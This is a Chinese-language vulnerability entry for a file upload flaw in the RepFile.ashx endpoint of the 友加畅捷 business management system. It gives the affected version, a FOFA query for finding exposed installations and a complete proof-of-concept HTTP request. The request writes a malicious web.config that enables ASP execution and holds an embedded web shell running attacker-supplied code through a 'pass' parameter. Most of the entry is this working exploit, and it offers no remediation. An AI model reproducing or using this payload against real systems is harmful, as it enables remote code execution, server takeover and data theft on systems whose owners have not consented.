## 友加畅捷管理系统-RepFile.ashx-文件上传漏洞

## 一、漏洞简介
友加畅捷管理系统是一款专为小微商贸流通企业设计的财务业务一体化管理软件，涵盖进销存、财务、分销及移动管理等多个模块，旨在帮助企业实现高效的业务运营和财务核算。

该系统在 RepFile.ashx 文件上传接口中存在文件上传漏洞。由于系统在处理上传文件时会使用 xmlDoc.Load 进行加载，这导致攻击者只能成功上传能够被 XML 解析器正确解析的文件。尽管上传的文件类型受到 XML 格式的限制，但恶意攻击者仍可能利用此漏洞，通过构造恶意的 XML 文件，结合其他潜在的解析或处理缺陷，实现拒绝服务、信息泄露，甚至在特定条件下进一步导致远程代码执行，对系统的可用性、完整性和机密性构成威胁。

## 二、影响版本
18.8000.1083.1000

## fofa
```
icon_hash="2049187099" || fid="zzt8lL7SUwIIZQXZY6rTSw=="
```

## POC
```
POST /ReportDesign/RepFile.ashx?RepFile=pages/web.config&Type=SaveRepFileData HTTP/1.1
Host: youjiasoft.mrxn.net
SOAPAction: http://tempuri.org/login
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
        <hiddenSegments>
          <remove segment="web.config" />
        </hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
  <system.web>
        <authorization>
            <allow users="*" />  
        </authorization>
    </system.web>
</configuration>
<!--
<%
Response.CodePage = 65001
Response.Charset = "UTF-8"
Response.write("-"&"->")
Response.write(1+2)
on error resume next
Response.write("<pre>")
if execute(request("pass")) <>"" then execute(request("pass"))
Response.write("</pre>")
Response.write("<!-"&"-")
%>
-->
```
